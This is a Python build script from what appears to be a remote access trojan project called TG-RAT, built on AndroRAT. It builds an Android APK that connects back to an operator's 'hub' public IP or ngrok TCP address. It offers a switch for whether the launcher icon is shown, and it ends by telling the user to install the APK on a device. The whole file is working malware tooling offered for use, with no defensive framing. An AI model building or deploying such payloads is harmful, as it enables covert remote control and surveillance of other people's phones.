#!/usr/bin/env python3
"""Build AndroRAT APK pointed at your hub's public TCP address."""
import argparse
import os
import sys

# Run from AndroRAT directory
_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, _HERE)
os.chdir(_HERE)

from utils import build, stdOutput  # noqa: E402

_ROOT = os.path.abspath(os.path.join(_HERE, ".."))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

try:
    from shared import tg_config
except ImportError:
    tg_config = None


def main():
    p = argparse.ArgumentParser(description="Build APK for TG-RAT hub")
    p.add_argument("-o", "--output", default="tg-rat-android.apk", help="Output APK name")
    p.add_argument("-i", "--ip", help="Hub public IP/hostname (or ANDROID_PUBLIC_HOST)")
    p.add_argument("-p", "--port", help="Hub TCP port (or ANDROID_PUBLIC_PORT)")
    p.add_argument("--icon", action="store_true", help="Show launcher icon")
    args = p.parse_args()

    host = args.ip or (tg_config.android_public_host if tg_config else "") or os.environ.get("ANDROID_PUBLIC_HOST")
    port = args.port or (tg_config.android_public_port if tg_config else "") or os.environ.get("ANDROID_PUBLIC_PORT", "8000")

    if not host:
        print(stdOutput("error") + "Set -i <host> or ANDROID_PUBLIC_HOST (ngrok TCP / VPS hostname)")
        sys.exit(1)

    print(stdOutput("info") + f"Building APK -> {host}:{port}")
    build(host, str(port), args.output, False, None, True if args.icon else None)
    print(stdOutput("success") + f"Install {args.output} on the device. Hub must accept TCP on port {port}.")


if __name__ == "__main__":
    main()
